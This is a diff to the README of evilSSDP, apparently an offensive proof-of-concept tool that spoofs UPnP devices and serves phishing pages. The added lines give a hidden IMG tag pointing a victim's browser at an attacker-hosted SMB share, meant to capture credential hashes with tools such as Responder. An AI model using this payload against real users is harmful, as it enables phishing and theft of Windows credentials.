@@ -85,6 +85,12 @@ evilSSDP will pull a file from the templates folder (upnp-basic-device in POC) a
 
 A key line in this file contains the 'Presentation URL'. This is what will load in a user's browser if they decide to manually double-click on the uPNP device. evilSSDP will host this file automatically (phish-bitcoin in POC), plugging in your source IP address into an IMG tag to access an SMB share that you can host with tools like [Impacket](https://www.coresecurity.com/corelabs-research/open-source-tools/impacket), [Responder](https://github.com/SpiderLabs/Responder), or [Metasploit](https://www.rapid7.com/db/modules/auxiliary/server/capture/smb).
 
+The IMG tage looks like this:
+
+```
+<img src="file://///$localIp/smb/hash.jpg" style="display: none;" /><br>
+```
+
 # Customization
 This is an early POC, but constructed in such a way to allow easy template creation in the future. For now, you can simply tweak the existing files in the 'templates' folder to rename the device, craft a custom phishing page, etc.
 
